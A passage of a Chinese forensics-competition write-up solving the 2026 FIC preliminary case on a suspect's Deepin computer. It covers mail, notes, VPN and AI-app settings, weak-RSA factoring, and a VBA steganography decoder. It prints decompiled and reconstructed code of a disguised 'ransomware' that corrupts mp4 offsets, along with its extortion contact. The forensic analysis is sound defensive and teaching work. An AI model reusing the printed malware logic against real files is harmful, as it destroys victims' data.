@@ -1,0 +1,9138 @@
+2026 FIC 初赛 - XD Forensics Wiki
+https://forensics.xidian.edu.cn/writeups/FIC2026Preliminary/
+
+第六届 FIC 全国网络空间取证大赛 初赛 题解
+¶
+Author
+NoahTie & BlackBird & Track @ tratra 什么都会
+参赛和题解中均使用了弘连的商业取证软件, 包括: 火眼证据分析、火眼仿真取证、数据库取证取证工具及雷电 APP 智能分析。
+感谢上海弘连网络科技有限公司为西电电子数据取证提供的软件支持!
+比赛信息
+¶
+关于"赛前分析"笔记块
+在本题解的案情部分中, 有一些标题为"赛前分析"的笔记块. 这些笔记块是赛前校内做赛前分享时, 根据赛事已公开的案情和检材信息进行推测的内容, 与赛事官方无关.
+案情介绍
+¶
+某日，警方接到举报，举报人称近期互联网上出现了一
+涉黄网站
+极为活跃并大肆推广。警方跟进线索分析后，找到相应的网站进行了摸排调查，最终锁定网站的运营者李安弘，警方在对其实施抓捕的现场对电子数据进行了提取固定。
+赛前分析
+案件核心是"涉黄网站", 说明有服务器分析. 根据以往的经验 + 大部分涉黄网站的架构来看, 很可能是 WordPress/DedeCMS(织梦CMS)/其他CMS + 宝塔/其他服务器组件聚合.
+CMS: Content Manage System, 内容管理系统.
+WordPress: 最常见且最方便的部署方式是通过 Docker 部署.
+CMS: 最常见的部署方式是使用 LAMP/宝塔/手动部署. 组件包括 PHP + Nginx/Apache + MySQL/MariaDB + PHPMyAdmin. 大多基于 ThinkPHP 二次开发. 苹果CMS(MacCms)/海洋CMS(SeaCms)/飞飞CMS(FeiFeiCms)/玥雅CMS(YYCMS).
+苹果CMS:
+https://www.maccms.plus/guide/
+基于 PHP, ThinkPHP 5.x.
+海洋CMS:
+https://seacms.net/
+基于 PHP.
+飞飞CMS:
+http://www.feifancms.com/index.html
+基于 PHP, ThinkPHP 5.x.
+玥雅CMS:
+https://github.com/dusdong/yycms
+基于 ASP.Net, Angularjs.
+题目中还提即到"极为活跃并大肆推广". 根据现实情况来看, 这类网站很可能不止一个域名.
+通过对李安弘的审讯，警方了解到，其雇佣了技术人员帮忙架设
+淫秽视频平台
+，并找到境外团队对网站进行
+推广
+，经过审讯和调查，该嫌疑人还有
+多种其他违法行为
+，用以
+牟利
+。
+赛前分析
+视频平台
+这里专门提到了视频平台, 因此除了上述的 CMS/WordPress 之外, 还有可能架设了流媒体服务器. 目前常见的流媒体服务器包含:
+Nginx: 直接安装 nginx-rtmp-module 插件或 nginx-http-flv-module 插件. 可能性不大.
+RTMP Server: 一类服务器应用的统称, 可以提供流媒体/直播等服务. 目前见过用在相关途径的有 LiveQing(直播)/SRS(流媒体)/EasyDarwin等. 均可以使用 Docker 部署/直接运行二进制程序运行.
+家庭流媒体库: Jellyfin\Emby.
+赛前分析
+视频文件的存储和分发方式
+网站直接存储 MP4 文件
+Nginx 提供静态视频访问
+HLS 切片
+.m3u8
++
+.ts
+第三方对象存储/CDN (概率小)
+Docker 中部署的视频服务
+赛前分析
+牟利
+值得推敲的是, 案情中提到了"多种其他违法行为". 关于牟利, 目前常见的情况有:
+诈骗/赌博引流: 绝大多数"涉黄网站"的最终目的和盈利手段. 如果与诈骗有关, 可能会有相关的 APK 检材. 参考
+第三届 长安杯电子数据取证竞赛 题解
+中的相关内容. 弘连的出题人可能会复用以前的 APP 框架.
+广告收入: 这里不太可能.
+个人信息收集/销售: 收集支付信息、联系方式后进行二次变现. 支付信息主要是信用卡卡号/CVV 的盗用.
+售卖会员: 直接售卖网站的会员盈利, 可能涉及到洗钱. 涉及到流水分析.
+打赏: 直播平台采取的盈利方式.
+赛前分析
+推广引流
+可能的推广方式:
+Telegram/X(Twitter)等境外社交平台
+QQ/微信群
+线下小广告
+请各位参赛选手对检材进行分析，尝试还原整个案件和关键信息。
+检材信息
+¶
+容器密码:
+FIC-{e404d6e66586e9460c23755afab5a872bcf78ab4}
+检材清单:
+检材1-计算机.E01
+检材2-手机.tar
+检材3-服务器
+检材3-1.E01
+检材3-2.E01
+检材4-U盘.E01
+计算机部分
+¶
+Info
+以下题目分析计算机检材。
+用火眼挂载检材之后, 识别到了 Linux 系统. 查看 Linux基本信息 -> 系统信息 分析结果, 是一个 Deepin 系统 (Debian 的发行版) 的计算机:
+01 操作系统版本号
+¶
+答案
+23.1
+见上图.
+Deepin 的版本号为 23.1, 基于 Debian 12 (Bookworm).
+/usr/lib/os-release
+和
+/etc/os-version
+是 Deepin 的发行版本信息.
+02 李安弘曾收到一份免费领取
+token
+的疑似钓鱼邮件，其发送用户邮箱
+¶
+答案
+hf13338261292@outlook.com
+该镜像中, 根目录与用户目录分为 2 个分区, 分别是分区 4 (
+/
+) 和分区 7 (
+/var
+).
+在火眼的分析结果 Eml 邮件 -> 邮件 中可以看到检材中包含的邮件, 其中有 3 条主题分别为"转发: 推广设计图", "Token 限时免费领"和"回复：Token 限时免费领"的可疑邮件:
+这些 Eml 文件位于 deepin-mail 的缓存目录
+home/lha/.local/share/deepin/deepin-mail/
+中, 该目录包含以下子目录:
+该检材计算机的邮箱登录了 2 个邮箱账号, 分别是 163 邮箱和 outlook 邮箱. 进入每个子目录后即可看到登录的邮箱账号分别为
+lihongan19851024@163.com
+和
+lihongan1985@outlook.com
+.
+"Token 限时免费领"应为本题提及的钓鱼邮件, 查看 Eml 文件:
+03 李安弘电脑中记录的黄金换现金的商家联系方式
+¶
+答案
+13612817854
+在快捷方式中搜索关于"备忘", "记事", "笔记", "memo", "note"等的应用, 发现只安装了一个"语音记事本".
+该应用的数据存储在
+分区7/home/lha/.local/share/deepin/deepin-voice-note/
+目录中, 其中的
+deepin-voice-note1.0.db
+为存储用户数据的数据库. 查看数据库, 在
+vnote_items_tbl
+中看到保存的记事本条目:
+除了题目中提及到的"黄金换现金"之外, 还能看到关于架设视频网站的信息, 提及到了 uuutalk 应用:
+或者仿真后查看:
+另一种答案
+¶
+在 Deepin 浏览器的历史纪录中看到搜索过"收购黄金":
+使用 Nirsoft 的 ChromeCacheView 工具读取浏览器的缓存目录
+/home/lha/.cache/browser/Default/Cache/Cache_Data
+筛选其中的内容类型(Content Type)为
+text/html
+的缓存, 即访问网页的缓存, 在其中找到 1 条百度的搜索记录:
+复制该条记录, 对 URL 中的 URL 编码进行解码, 看到搜索的关键词为"收购黄金":
+可以看到相应内容的编码(Content Encoding)为"br", 为 Brotli 压缩算法.  在 ChromeCacheView 中导出相应文件, 使用 Python 的 brotli 包解压:
+Python
+import
+brotli
+file
+=
+open
+(
+"d:/CaseFiles/FileOutput/1.htm"
+,
+"rb"
+)
+.
+read
+()
+open
+(
+"d:/CaseFiles/FileOutput/1.decompressed.htm"
+,
+"wb"
+)
+.
+write
+(
+brotli
+.
+decompress
+(
+file
+))
+在其中以正则
+1[3456789]\d{9}
+搜索手机号, 找到与黄金收购相关的手机号:
+04 推广设计图中的 APK 下载链接
+¶
+答案
+https://drive.google.com/file/d/1z3aRS-lkaJYKm7Cp1XjtUmVPsOEVW2fV/view?usp=sharing
+邮件附件中有 3 个文件:
+HTML 中有项目的 GitLab 地址:
+HTML
+<!-- <author>https://gitlab.com/z583985166/sec-file</author> -->
+访问该地址之后可以看到用于加密的脚本
+enc.py
+, 其中用于生成密钥的函数为
+gen
+, 其中生成
+\(p\)
+和
+\(q\)
+时限制了
+\(q = p + 2 \times n,\,\, n \in \mathbb{N}\)
+:
+Python
+def
+gen
+():
+"""Encodes binary data into a RSA string for safe transmission/storage."""
+p
+=
+getPrime
+(
+512
+)
+q
+=
+p
++
+2
+while
+not
+isPrime
+(
+q
+):
+q
++=
+2
+n
+=
+p
+*
+q
+e
+=
+65537
+phi
+=
+(
+p
+-
+1
+)
+*
+(
+q
+-
+1
+)
+d
+=
+pow
+(
+e
+,
+-
+1
+,
+phi
+)
+with
+open
+(
+"public.txt"
+,
+"w"
+)
+as
+f_pub
+:
+f_pub
+.
+write
+(
+f
+"
+{
+n
+}
+\n
+{
+e
+}
+"
+)
+with
+open
+(
+"private.txt"
+,
+"w"
+)
+as
+f_priv
+:
+f_priv
+.
+write
+(
+f
+"
+{
+n
+}
+\n
+{
+d
+}
+"
+)
+return
+n
+,
+e
+加密图片查看.html
+使用私钥对图片文件进行解密:
+JavaScript
+document
+.
+getElementById
+(
+"keyFile"
+)
+.
+addEventListener
+(
+"change"
+,
+function
+(
+e
+)
+{
+const
+file
+=
+e
+.
+target
+.
+files
+[
+0
+];
+if
+(
+!
+file
+)
+return
+;
+const
+reader
+=
+new
+FileReader
+();
+reader
+.
+onload
+=
+(
+e
+)
+=>
+(
+document
+.
+getElementById
+(
+"keyArea"
+).
+value
+=
+e
+.
+target
+.
+result
+);
+reader
+.
+readAsText
+(
+file
+);
+});
+function
+modPow
+(
+base
+,
+exp
+,
+mod
+)
+{
+let
+res
+=
+BigInt
+(
+1
+);
+base
+=
+base
+%
+mod
+;
+while
+(
+exp
+>
+0n
+)
+{
+if
+(
+exp
+%
+2n
+===
+1n
+)
+res
+=
+(
+res
+*
+base
+)
+%
+mod
+;
+base
+=
+(
+base
+*
+base
+)
+%
+mod
+;
+exp
+=
+exp
+/
+2n
+;
+}
+return
+res
+;
+}
+function
+bigIntToBytes
+(
+bn
+,
+len
+)
+{
+let
+hex
+=
+bn
+.
+toString
+(
+16
+);
+if
+(
+hex
+.
+length
+%
+2
+!==
+0
+)
+hex
+=
+"0"
++
+hex
+;
+let
+bytes
+=
+new
+Uint8Array
+(
+len
+);
+let
+hexMatch
+=
+hex
+.
+match
+(
+/.{1,2}/g
+);
+let
+hexBytes
+=
+hexMatch
+?
+hexMatch
+.
+map
+((
+b
+)
+=>
+parseInt
+(
+b
+,
+16
+))
+:
+[];
+for
+(
+let
+i
+=
+0
+;
+i
+<
+hexBytes
+.
+length
+;
+i
+++
+)
+{
+if
+(
+len
+-
+1
+-
+i
+>=
+0
+)
+{
+bytes
+[
+len
+-
+1
+-
+i
+]
+=
+hexBytes
+[
+hexBytes
+.
+length
+-
+1
+-
+i
+];
+}
+}
+return
+bytes
+;
+}
+async
+function
+startDecrypt
+()
+{
+const
+keyText
+=
+document
+.
+getElementById
+(
+"keyArea"
+).
+value
+.
+trim
+();
+const
+encFileInput
+=
+document
+.
+getElementById
+(
+"encFile"
+).
+files
+[
+0
+];
+const
+log
+=
+document
+.
+getElementById
+(
+"log"
+);
+const
+output
+=
+document
+.
+getElementById
+(
+"output"
+);
+if
+(
+!
+keyText
+||
+!
+encFileInput
+)
+{
+alert
+(
+"请提供私钥和加密文件！"
+);
+return
+;
+}
+try
+{
+// 解析 n 和 d
+const
+lines
+=
+keyText
+.
+split
+(
+"\n"
+)
+.
+map
+((
+s
+)
+=>
+s
+.
+trim
+())
+.
+filter
+((
+s
+)
+=>
+s
+.
+length
+>
+0
+);
+if
+(
+lines
+.
+length
+<
+2
+)
+throw
+new
+Error
+(
+"密钥格式不正确，需要 n 和 d 各占一行"
+);
+const
+n
+=
+BigInt
+(
+lines
+[
+0
+]);
+const
+d
+=
+BigInt
+(
+lines
+[
+1
+]);
+log
+.
+innerText
+=
+"读取加密文件中..."
+;
+const
+buffer
+=
+await
+encFileInput
+.
+arrayBuffer
+();
+const
+data
+=
+new
+Uint8Array
+(
+buffer
+);
+const
+encBlockSize
+=
+128
+;
+const
+plainChunkSize
+=
+120
+;
+const
+totalBlocks
+=
+data
+.
+length
+/
+encBlockSize
+;
+if
+(
+data
+.
+length
+%
+encBlockSize
+!==
+0
+)
+{
+throw
+new
+Error
+(
+"加密文件长度异常（不是128字节的倍数）"
+);
+}
+let
+resultBuffer
+=
+new
+Uint8Array
+(
+totalBlocks
+*
+plainChunkSize
+);
+for
+(
+let
+i
+=
+0
+;
+i
+<
+totalBlocks
+;
+i
+++
+)
+{
+log
+.
+innerText
+=
+`解密中:
+${
+Math
+.
+round
+((
+i
+/
+totalBlocks
+)
+*
+100
+)
+}
+%`
+;
+const
+block
+=
+data
+.
+slice
+(
+i
+*
+encBlockSize
+,
+(
+i
++
+1
+)
+*
+encBlockSize
+);
+// 字节转 BigInt
+const
+c
+=
+BigInt
+(
+"0x"
++
+Array
+.
+from
+(
+block
+)
+.
+map
+((
+b
+)
+=>
+b
+.
+toString
+(
+16
+).
+padStart
+(
+2
+,
+"0"
+))
+.
+join
+(
+""
+),
+);
+// RSA 解密
+const
+m
+=
+modPow
+(
+c
+,
+d
+,
+n
+);
+// 转回字节
+const
+mBytes
+=
+bigIntToBytes
+(
+m
+,
+plainChunkSize
+);
+resultBuffer
+.
+set
+(
+mBytes
+,
+i
+*
+plainChunkSize
+);
+if
+(
+i
+%
+20
+===
+0
+)
+await
+new
+Promise
+((
+r
+)
+=>
+setTimeout
+(
+r
+,
+1
+));
+}
+log
+.
+innerText
+=
+"解密成功！正在渲染..."
+;
+const
+blob
+=
+new
+Blob
+([
+resultBuffer
+]);
+const
+url
+=
+URL
+.
+createObjectURL
+(
+blob
+);
+output
+.
+innerHTML
+=
+`<h3>解密完成</h3><img src="
+${
+url
+}
+">`
+;
+}
+catch
+(
+e
+)
+{
+log
+.
+innerText
+=
+"错误: "
++
+e
+.
+message
+;
+console
+.
+error
+(
+e
+);
+}
+}
+public.txt
+中保存的是公钥:
+Text Only
+57751892008149574447756694613209346511056045951970458143905594411398554113111623746466692172544473909892773600617029641656248235151775166339061269972238018743173330948084699695182438765935110193323089354031112350869626121317836465551360104372140181097747761558797918522051881262043738603183528521379831286761
+65537
+要根据公钥爆破私钥, 由于生成密钥时使用了相近的
+\(p\)
+和
+\(q\)
+因此直接分解
+\(n\)
+. 使用 gmpy2 的 iroot 开根:
+或者用 yafu 分解:
+之后再解密
+推广设计图.png.enc
+得到图片, 识别图片二维码得到
+https://drive.google.com/file/d/1z3aRS-lkaJYKm7Cp1XjtUmVPsOEVW2fV/view?usp=sharing
+.
+05 李安弘电脑 VPN 软件开放的代理端口
+¶
+答案
+9527
+在开机启动项的分析结果中可以看到 Clash Verge 的服务:
+Linux 系统的用户配置文件大多位于
+/home/<user>/.config
+和
+/home/<user>/.local
+目录中, 在
+/分区7/home/lha/.local/share/io.github.clash-verge-rev.clash-verge-rev/
+目录中找到 Clash Verge 的配置文件
+clash-verge.yaml
+, 查看配置内容:
+YAML
+# Generated by Clash Verge
+mode
+:
+rule
+mixed-port
+:
+9527
+allow-lan
+:
+false
+log-level
+:
+info
+ipv6
+:
+true
+external-controller
+:
+''
+secret
+:
+set-your-secret
+unified-delay
+:
+true
+bind-address
+:
+'*'
+# snip
+开放的端口为 9527, 类型为 mixed-port.
+06 李安弘电脑中 AI 软件当前使用的模型类型
+¶
+答案
+OpenRouter
+在快捷方式分析结果中可以找到与 AI 相关的应用:
+在
+/分区7/home/lha/.local/share/deepin/uos-ai-assistant
+目录找到 UOS AI 的用户数据, 其中的
+db/basic
+为存储用户数据的数据库. 在
+llm
+表中保存了当前正在使用的模型信息. 但这里的信息存在矛盾, 模型名称保存为 "deepseek", 但查看
+ext
+字段的数据之后, 可以看到实际上使用的是 OpenRouter 提供的 GPT-OSS-120B 模型.
+这里如果不确定该填"deepseek", "GPT-OSS"还是"OpenRouter"的话, 可以仿真镜像, 打开仿真虚拟机中的"UOS AI"应用(任务栏中长得像 Copilot 的图标)查看设置:
+07 李安弘电脑中 AI 软件当前使用的模型 API Key
+¶
+答案
+[REDACTED_API_KEY]
+在
+llm
+表中的
+account_proxy
+字段中保存的 JSON 配置中包含 API Key 信息:
+JSON
+{
+"apiKey"
+:
+"[REDACTED_API_KEY]"
+,
+"apiSecret"
+:
+""
+,
+"appId"
+:
+""
+,
+"socketProxy"
+:
+{
+"host"
+:
+""
+,
+"pass"
+:
+""
+,
+"port"
+:
+0
+,
+"socketProxyType"
+:
+0
+,
+"user"
+:
+""
+}
+}
+08 李安弘电脑中勒索软件提供的解密服务联系方式
+¶
+答案
+beijixin996@tutanota.com
+直接访问钓鱼邮件中的 GitHub 地址:
+发现
+1.0.0
+tag 中的发行文件已经被更换, 并非链接中的
+get_token_linux
+, 而是一个
+get_token_windows.exe
+文件:
+因此无法在线固定勒索软件.
+在终端历史记录中可以看到关于
+get_token_linux
+的命令:
+但在整个根目录中搜索
+get_token_linux
+后, 未找到该二进制文件. 因此, 推测二进制文件位于镜像中的 VC 加密分区中. 火眼会自动识别到镜像中第 2 个分区为 VeraCrypt/TrueCrypt 类容器. 这里需要用到安卓手机检材中, 保存在备忘录中的容器密码:
+原始文件位于小米笔记的应用目录中:
+使用该密码
+9ed2@99y8.com.cn
+即可解密 VC 加密分区. 方法比较多:
+使用火眼的解密功能(不是很稳定)
+直接用 VeraCrypt 挂载火眼挂载在
+C:/hl-net/
+目录下的
+$未分配簇
+使用 FTK Imager 将分区挂载为逻辑设备, 再在 VeraCrypt 中选择不带引导分区的逻辑分区进行挂载
+也可以直接在仿真虚拟机中挂载, VeraCrypt 的程序包位于数据盘的
+/tool
+目录中, 但部分文件被标记为隐藏文件, 需要通过终端查看:
+使用 ida 加载, 找到反编译的主函数
+main/main_main
+:
+C
+qmemcpy
+(
+ptr
+,
+"*.mp4"
+,
+sizeof
+(
+ptr
+));
+v2
+=
+ptr
+;
+runtime_slicebytetostring
+(
+0
+,
+ptr
+,
+5
+,
+*
+(
+string_0
+*
+)
+&
+v0
+.
+array
+);
+path_filepath_globWithLimit
+(
+*
+(
+string_0
+*
+)(
+&
+v2
+-
+1
+),
+0
+,
+v0
+,
+v17
+);
+// 查找目录下的所有符合 `*.mp4` 格式的文件名
+if
+(
+!
+v0
+.
+array
+&&
+ptr
+)
+{
+v4
+=
+0
+;
+while
+(
+(
+__int64
+)
+v2
+>
+0
+)
+{
+v14
+=
+v2
+;
+v9
+=
+v4
+;
+v15
+=
+v3
+;
+main__a
+(
+*
+v3
+,
+0x539u
+,
+0
+);
+// 对每个 mp4 文件执行 `main__a` 函数
+v4
+=
+v5
+|
+v9
+;
+v2
+=
+v14
+-
+1
+;
+v3
+=
+v15
++
+1
+;
+}
+if
+(
+v4
+)
+// 如果成功加密了文件, 则将勒索信息输出到文件
+{
+*
+(
+_QWORD
+*
+)
+v10
+=
+0xAFE886AFE5A3A7E8LL
+;
+v11
+=
+0xBBB3E7BBB3E720B7LL
+;
+// 端序转换, UTF-8 解码: 解密请 系系
+qmemcpy
+(
+v12
+,
+"beijixin996@tutanota.com"
+,
+sizeof
+(
+v12
+));
+v20
+.
+len
+=
+(
+int
+)
+v10
+;
+runtime_slicebytetostring
+(
+0
+,
+v10
+,
+40
+,
+*
+(
+string_0
+*
+)
+&
+v0
+.
+array
+);
+a
+[
+1
+]
+=
+v1
+;
+runtime_convTstring
+(
+v20
+,
+v6
+);
+*
+(
+_QWORD
+*
+)
+&
+a
+[
+1
+]
+=
+&
+RTYPE_string
+;
+*
+((
+_QWORD
+*
+)
+&
+a
+[
+1
+]
++
+1
+)
+=
+v20
+.
+str
+;
+v20
+.
+len
+=
+(
+int
+)
+os_Stdout
+;
+v20
+.
+str
+=
+(
+uint8
+*
+)
+&
+go_itab__ptr_os_File_comma_io_Writer
+;
+v21
+.
+array
+=
+(
+interface__0
+*
+)
+&
+a
+[
+1
+];
+v21
+.
+len
+=
+1
+;
+v21
+.
+cap
+=
+1
+;
+fmt_Fprint
+((
+io_Writer_0
+)
+v20
+,
+v21
+,
+v7
+,
+v18
+);
+time_Sleep
+(
+1000000000
+);
+*
+(
+_QWORD
+*
+)
+&
+a
+[
+0
+]
+=
+&
+RTYPE_string
+;
+*
+((
+_QWORD
+*
+)
+&
+a
+[
+0
+]
++
+1
+)
+=
+&
+off_4FCB10
+;
+v20
+.
+len
+=
+(
+int
+)
+os_Stdout
+;
+v20
+.
+str
+=
+(
+uint8
+*
+)
+&
+go_itab__ptr_os_File_comma_io_Writer
+;
+v21
+.
+array
+=
+(
+interface__0
+*
+)
+a
+;
+v21
+.
+len
+=
+1
+;
+v21
+.
+cap
+=
+1
+;
+fmt_Fprint
+((
+io_Writer_0
+)
+v20
+,
+v21
+,
+v8
+,
+v19
+);
+}
+}
+09 李安弘电脑中记录的存放黄金的保险柜编号是？
+¶
+答案
+997546
+接上题. 查看反编译的函数
+main/main__a
+:
+C
+name
+=
+_b
+.
+str
+;
+os_ReadFile
+(
+_b
+,
+*
+(
+_slice_uint8_0
+*
+)
+&
+_c
+,
+v3
+,
+v19
+,
+v20
+);
+if
+(
+!
+_r0
+)
+{
+*
+(
+_QWORD
+*
+)
+&
+sep
+[
+5
+]
+=
+v4
+;
+*
+(
+_QWORD
+*
+)
+&
+sep
+[
+3
+]
+=
+v5
+;
+*
+(
+_QWORD
+*
+)
+&
+sep
+[
+1
+]
+=
+_b
+.
+len
+;
+sep
+[
+0
+]
+=
+1868788851
+;
+// 'octs'
+v24
+.
+array
+=
+(
+uint8
+*
+)
+sep
+;
+v24
+.
+len
+=
+4
+;
+v24
+.
+cap
+=
+4
+;
+bytes_Index
+(
+*
+(
+_slice_uint8_0
+*
+)
+&
+_b
+.
+str
+,
+v24
+,
+v6
+);
+if
+(
+v7
+!=
+-1
+)
+{
+v8
+=
+v7
++
+12
+;
+v9
+=
+*
+(
+_QWORD
+*
+)
+&
+sep
+[
+1
+];
+if
+(
+*
+(
+__int64
+*
+)
+&
+sep
+[
+1
+]
+>=
+v7
++
+12
+)
+{
+if
+(
+*
+(
+_QWORD
+*
+)
+&
+sep
+[
+3
+]
+<
+v8
+)
+runtime_panicSliceAcap
+();
+if
+(
+v8
+<
+v7
++
+8
+)
+runtime_panicSliceB
+();
+v10
+=
+*
+(
+_QWORD
+*
+)
+&
+sep
+[
+3
+];
+v11
+=
+*
+(
+_QWORD
+*
+)
+&
+sep
+[
+5
+];
+v12
+.
+tab
+=
+(
+internal_abi_ITab
+*
+)
+_byteswap_ulong
+(
+*
+(
+_DWORD
+*
+)(
+*
+(
+_QWORD
+*
+)
+&
+sep
+[
+5
+]
++
+((
+v7
++
+8
+)
+&
+((
+8
+-
+(
+*
+(
+_QWORD
+*
+)
+&
+sep
+[
+3
+]
+-
+v7
+))
+>>
+63
+))));
+if
+(
+*
+(
+__int64
+*
+)
+&
+sep
+[
+1
+]
+>=
+v7
++
+4L
+L
+*
+LODWORD
+(
+v12
+.
+tab
+)
++
+12
+)
+{
+v12
+.
+data
+=
+(
+void
+*
+)
+_c
+;
+for
+(
+i
+=
+0
+;
+i
+<
+LODWORD
+(
+v12
+.
+tab
+);
+i
+=
+v14
++
+1
+)
+{
+v14
+=
+i
+;
+v15
+=
+4
+*
+i
+;
+v16
+=
+v7
++
+v15
++
+16
+;
+v17
+=
+v7
++
+v15
++
+12
+;
+if
+(
+v10
+<
+v16
+)
+runtime_panicSliceAcap
+();
+if
+(
+v16
+<
+v17
+)
+runtime_panicSliceB
+();
+*
+(
+_DWORD
+*
+)(
+v11
++
+(
+v17
+&
+((
+__int64
+)(
+12
+-
+(
+v10
+-
+(
+v7
++
+v15
+)))
+>>
+63
+)))
+=
+_byteswap_ulong
+(
+_c
++
+_byteswap_ulong
+(
+*
+(
+_DWORD
+*
+)(
+v11
++
+(
+v17
+&
+((
+__int64
+)(
+12
+-
+(
+v10
+-
+(
+v7
++
+v15
+)))
+>>
+63
+)))));
+}
+v18
+=
+name
+;
+os_WriteFile
+(
+_b
+,
+*
+(
+_slice_uint8_0
+*
+)(
+&
+v9
+-
+1
+),
+0x1A4u
+,
+v12
+);
+}
+}
+}
+}
+其行为是搜索文件中的
+stco
+, 对之后的数据按照每一个 UInt32 进行加
+delta
+的操作:
+Go
+func
+main_a
+(
+path
+string
+,
+delta
+uint32
+,
+skip
+bool
+)
+{
+data
+,
+err
+:=
+os
+.
+ReadFile
+(
+path
+)
+idx
+:=
+bytes
+.
+Index
+(
+data
+,
+[]
+byte
+(
+"stco"
+))
+count
+:=
+binary
+.
+BigEndian
+.
+Uint32
+(
+data
+[
+idx
++
+8
+:])
+for
+i
+:=
+uint32
+(
+0
+);
+i
+<
+count
+;
+i
+++
+{
+pos
+:=
+idx
++
+12
++
+int
+(
+i
+)
+*
+4
+val
+:=
+binary
+.
+BigEndian
+.
+Uint32
+(
+data
+[
+pos
+:])
+binary
+.
+BigEndian
+.
+PutUint32
+(
+data
+[
+pos
+:],
+val
++
+delta
+)
+}
+os
+.
+WriteFile
+(
+path
+,
+data
+,
+0644
+)
+}
+delta
+的值在调用时传参, 为
+0x539
+. 写一个脚本反向改回去:
+Python
+import
+struct
+,
+sys
+data
+=
+bytearray
+(
+open
+(
+'./202603121310.mp4'
+,
+'rb'
+)
+.
+read
+())
+delta
+=
+0x539
+pos
+=
+data
+.
+find
+(
+b
+'stco'
+)
+count
+=
+struct
+.
+unpack
+(
+'>I'
+,
+data
+[
+pos
++
+8
+:
+pos
++
+12
+])[
+0
+]
+for
+i
+in
+range
+(
+count
+):
+p
+=
+pos
++
+12
++
+i
+*
+4
+struct
+.
+pack_into
+(
+'>I'
+,
+data
+,
+p
+,
+struct
+.
+unpack
+(
+'>I'
+,
+data
+[
+p
+:
+p
++
+4
+])[
+0
+]
+-
+delta
+)
+open
+(
+'./202603121310_dec.mp4'
+,
+'wb'
+)
+.
+write
+(
+data
+)
+视频文件
+202603121310.mp4
+中是与保险柜相关的内容:
+10 李安弘电脑中记录的保险柜密码是？
+¶
+答案
+583985
+在 WPS 最近访问文档中可以看到一些疑似保存了重要信息的 et 文件:
+打开后发现文表格内容均为彩色的点阵:
+在
+/tool/
+目录中有一个
+execelcrypt.txt
+文件, 看文件内容是一个将文本转换为点阵的脚本. 推测表格文件中的点阵就是由该脚本生成的. 在网上搜了一圈, 没找到类似的脚本, 于是丢给大模型写了个 VBA 的解隐写脚本:
+Text Only
+Function DecryptStego() As String
+' 收集所有形状的加密值并逆向计算点坐标
+Dim ws As Worksheet
+Set ws = Application.ActiveSheet
+Dim points() As Variant
+Dim count As Long
+count = 0
+' 第一步：提取所有形状的加密值并计算点坐标
+Dim shp As Shape
+For Each shp In ws.Shapes
+Dim valStr As String
+valStr = shp.AlternativeText
+If valStr <> "" Then
+Dim val As Long
+val = CLng(valStr)
+Dim a As Long, b As Long
+a = val \ 1000  ' 整数除法
+b = val Mod 1000
+Dim x As Long, y As Long
+x = (a Xor 85) - 100
+y = (b Xor 85) - 100
+' 存储点
+count = count + 1
+ReDim Preserve points(1 To 2, 1 To count)
+points(1, count) = x
+points(2, count) = y
+End If
+Next shp
+If count = 0 Then
+DecryptStego = ""
+Exit Function
+End If
+' 第二步：按x坐标排序
+Dim i As Long, j As Long
+For i = 1 To count - 1
+For j = i + 1 To count
+If points(1, i) > points(1, j) Then
+' 交换x坐标
+Dim temp As Long
+temp = points(1, i)
+points(1, i) = points(1, j)
+points(1, j) = temp
+' 交换y坐标
+temp = points(2, i)
+points(2, i) = points(2, j)
+points(2, j) = temp
+End If
+Next j
+Next i
+' 第三步：按字符索引分组（每个字符宽度25）
+Dim charGroups As Object
+Set charGroups = CreateObject("Scripting.Dictionary")
+For i = 1 To count
+Dim xVal As Long, yVal As Long
+xVal = points(1, i)
+yVal = points(2, i)
+' 计算字符索引
+Dim charIndex As Long
+charIndex = xVal \ 25  ' 整数除法
+' 检查点是否在有效范围内
+If (xVal - charIndex * 25) >= 0 And (xVal - charIndex * 25) <= 16 And _
+yVal >= 0 And yVal <= 24 Then
+' 计算局部坐标（缩放后的坐标）
+Dim localX As Long, localY As Long
+localX = (xVal - charIndex * 25) / 4
+localY = yVal / 4
+' 将点添加到对应的字符组
+If Not charGroups.Exists(charIndex) Then
+charGroups.Add charIndex, New Collection
+End If
+charGroups(charIndex).Add Array(localX, localY)
+End If
+Next i
+' 第四步：定义字体点阵（与生成代码完全一致）
+Dim fontDict As Object
+Set fontDict = CreateObject("Scripting.Dictionary")
+' 添加数字
+fontDict.Add "0", Array(Array(1,0), Array(2,0), Array(0,1), Array(3,1), Array(0,2), Array(3,2), Array(0,3), Array(3,3), Array(1,4), Array(2,4))
+fontDict.Add "1", Array(Array(2,0), Array(1,1), Array(2,1), Array(2,2), Array(2,3), Array(1,4), Array(2,4), Array(3,4))
+fontDict.Add "2", Array(Array(1,0), Array(2,0), Array(0,1), Array(3,1), Array(2,2), Array(1,3), Array(0,4), Array(1,4), Array(2,4), Array(3,4))
+fontDict.Add "3", Array(Array(0,0), Array(1,0), Array(2,0), Array(3,1), Array(1,2), Array(2,2), Array(3,3), Array(0,4), Array(1,4), Array(2,4))
+fontDict.Add "4", Array(Array(3,0), Array(2,1), Array(3,1), Array(1,2), Array(3,2), Array(0,3), Array(1,3), Array(2,3), Array(3,3), Array(4,3), Array(3,4))
+fontDict.Add "5", Array(Array(0,0), Array(1,0), Array(2,0), Array(0,1), Array(0,2), Array(1,2), Array(2,2), Array(3,3), Array(0,4), Array(1,4), Array(2,4))
+fontDict.Add "6", Array(Array(1,0), Array(2,0), Array(0,1), Array(0,2), Array(1,2), Array(2,2), Array(0,3), Array(3,3), Array(1,4), Array(2,4))
+fontDict.Add "7", Array(Array(0,0), Array(1,0), Array(2,0), Array(3,0), Array(3,1), Array(2,2), Array(1,3), Array(1,4))
+fontDict.Add "8", Array(Array(1,0), Array(2,0), Array(0,1), Array(3,1), Array(1,2), Array(2,2), Array(0,3), Array(3,3), Array(1,4), Array(2,4))
+fontDict.Add "9", Array(Array(1,0), Array(2,0), Array(0,1), Array(3,1), Array(1,2), Array(2,2), Array(3,2), Array(3,3), Array(2,4))
+' 添加小写字母
+fontDict.Add "a", Array(Array(1,2), Array(2,2), Array(3,2), Array(0,3), Array(3,3), Array(1,4), Array(2,4), Array(3,4))
+fontDict.Add "b", Array(Array(0,0), Array(0,1), Array(0,2), Array(1,2), Array(2,2), Array(0,3), Array(3,3), Array(0,4), Array(1,4), Array(2,4))
+fontDict.Add "c", Array(Array(1,0), Array(2,0), Array(3,0), Array(0,1), Array(0,2), Array(0,3), Array(1,4), Array(2,4), Array(3,4))
